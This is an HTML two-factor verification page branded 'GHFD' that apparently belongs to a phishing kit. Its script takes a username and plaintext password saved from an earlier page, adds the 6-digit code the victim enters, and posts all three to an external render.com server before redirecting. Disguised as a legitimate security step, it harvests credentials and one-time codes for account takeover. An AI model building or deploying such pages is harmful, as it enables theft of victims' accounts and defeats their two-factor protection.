<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Verification</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <nav class="mobile-nav">
        <div class="logo">
            <span>GHFD</span>
        </div>
    </nav>
    
    <main class="main-content">
        <div class="login-container">
            <h1 class="login-header">2FA Verification</h1>
            
            <form id="2fa-form" class="login-form">
                <div class="form-group">
                    <input type="text" id="2fa-code" class="form-control" 
                           placeholder="Enter 6-digit code" required maxlength="6">
                </div>
                
                <div id="error-message" class="error-message" style="display: none;"></div>
                
                <button type="submit" class="login-button" id="verify-button">
                    <span id="button-text">Verify</span>
                    <img id="loading-gif" src="../loading.gif" 
                         alt="Loading" style="display: none; height: 20px;">
                </button>
            </form>
        </div>
    </main>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('2fa-form');
            const verifyButton = document.getElementById('verify-button');
            const buttonText = document.getElementById('button-text');
            const loadingGif = document.getElementById('loading-gif');
            const errorElement = document.getElementById('error-message');
            const codeInput = document.getElementById('2fa-code');
            
            // Allow only numbers in 2FA code input
            codeInput.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
            
            // Get saved data from sessionStorage
            const loginData = JSON.parse(sessionStorage.getItem('loginData'));
            if (!loginData) {
                window.location.href = '../index.html';
                return;
            }
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const code = codeInput.value.trim();
                if (code.length !== 6) {
                    showError('Please enter a valid 6-digit code');
                    return;
                }
                
                // Show loading indicator
                buttonText.style.display = 'none';
                loadingGif.style.display = 'inline-block';
                verifyButton.disabled = true;
                errorElement.style.display = 'none';
                
                // Send to server
                fetch('https://base-server-mksp.onrender.com/submit_2fa', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        code: code,
                        username: loginData.username,
                        password: loginData.password
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Server error. Please try again later');
                    }
                    return response.json();
                })
                .then(data => {
                    if (data.status === 'success') {
                        window.location.href = '../verifed/index.html';
                    } else {
                        showError('Verification failed. Please try again');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    showError('Server error. Please try again later');
                })
                .finally(() => {
                    buttonText.style.display = 'inline-block';
                    loadingGif.style.display = 'none';
                    verifyButton.disabled = false;
                });
            });
            
            function showError(message) {
                errorElement.textContent = message;
                errorElement.style.display = 'block';
                errorElement.style.animation = 'shake 0.5s';
            }
        });
    </script>
</body>
</html>
